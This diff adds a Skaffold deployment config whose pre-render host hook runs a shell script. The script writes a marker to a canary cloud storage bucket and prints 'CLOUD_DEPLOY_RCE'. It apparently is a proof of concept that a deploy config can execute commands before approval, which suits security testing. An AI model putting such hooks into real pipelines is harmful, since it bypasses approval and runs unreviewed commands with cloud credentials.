@@ -1,0 +1,27 @@
+apiVersion: skaffold/v4beta7
+kind: Config
+metadata:
+  name: remote-cloud-operation
+manifests:
+  rawYaml:
+  - remote-service.yaml
+  hooks:
+    before:
+    - host:
+        command:
+        - /bin/sh
+        - -c
+        - >-
+          destination="gs://${CLOUD_DEPLOY_PROJECT_ID}-clouddeploy-hook-canary-20261002/proof/marker.txt";
+          if command -v gcloud >/dev/null 2>&1; then
+            printf 'CLOUD_DEPLOY_PREAPPROVAL_WRITE\n' | gcloud storage cp - "$destination" &&
+            printf 'CLOUD_DEPLOY_RCE durable_write=true client=gcloud\n';
+          elif command -v gsutil >/dev/null 2>&1; then
+            printf 'CLOUD_DEPLOY_PREAPPROVAL_WRITE\n' | gsutil cp - "$destination" &&
+            printf 'CLOUD_DEPLOY_RCE durable_write=true client=gsutil\n';
+          else
+            printf 'CLOUD_DEPLOY_RCE durable_write=false client=none\n';
+            exit 3;
+          fi
+deploy:
+  cloudrun: {}
